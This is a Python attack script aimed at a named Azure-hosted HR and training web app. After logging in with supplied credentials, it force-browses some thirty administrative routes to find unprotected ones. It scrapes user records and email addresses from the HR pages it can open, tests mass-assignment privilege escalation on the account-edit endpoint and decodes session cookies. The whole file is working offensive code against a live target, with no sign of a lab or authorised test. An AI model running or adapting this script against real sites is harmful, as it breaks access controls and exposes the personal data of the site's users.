import sys, json
import hack_api as H, intruso_api as I, escalada_api as E

BASE = 'https://app-landing-270-grados-dgbedwcgaxcdavc2.eastus2-01.azurewebsites.net'
LOGIN = BASE + '/Auth/Login'
alias, clave = sys.argv[1], sys.argv[2]

def p(t, d):
    print('\n=== ' + t + ' ===')
    print(json.dumps(d, ensure_ascii=False, indent=1)[:3500])

r = I.entrar(LOGIN, alias, clave, campo_extra='Recordarme=true')
print('login:', r.get('ok'))
if not r.get('ok'):
    sys.exit('no entro')

TH = ('TalentoHumano TalentoHumano/Index TalentoHumano/Usuarios TalentoHumano/Aprendices '
      'TalentoHumano/Instructores TalentoHumano/Contratistas TalentoHumano/Personas '
      'TalentoHumano/Cargos TalentoHumano/Areas TalentoHumano/Programas TalentoHumano/Fichas '
      'TalentoHumano/Matriculas TalentoHumano/Reportes TalentoHumano/Exportar '
      'TalentoHumano/Importar TalentoHumano/Roles TalentoHumano/Permisos '
      'TalentoHumano/Configuracion TalentoHumano/Contratos TalentoHumano/Certificados '
      'TalentoHumano/Asistencia TalentoHumano/Horarios TalentoHumano/Documentos '
      'Cuenta/Editar Cuenta/CambiarClave AprendizSena/Entregas AprendizSena/Notas '
      'AprendizSena/Actividades AprendizSena/Guias')
fp = E.forzar_panel(BASE, rutas=','.join(TH.split()), limite=30)
p('FORZAR', {'abiertas': [(f['ruta'], f['status'], f['largo']) for f in fp.get('abiertas', [])],
             'rotas': fp.get('rotas'), 'cerradas': fp.get('cerradas', [])[:20]})

for f in fp.get('abiertas', []):
    if 'talento' in f['ruta'].lower() and f['largo'] > 1500:
        us = I.sacar_usuarios(BASE + '/' + f['ruta'], max_filas=25)
        p('USUARIOS ' + f['ruta'], {'total': us.get('total_filas'),
                                    'filas': us.get('filas', [])[:10],
                                    'correos': us.get('correos', [])[:15]})

canario = None
for c in fp.get('cerradas', []):
    if 'talento' in c['ruta'].lower():
        canario = BASE + '/' + c['ruta']
        break
p('MASIVO', E.probar_masivo(BASE + '/Cuenta/Editar', canario=canario, url_login=LOGIN,
                            usuario=alias, clave=clave, limite=8))
p('COOKIES', E.decodificar_cookie())
print('\nFIN')
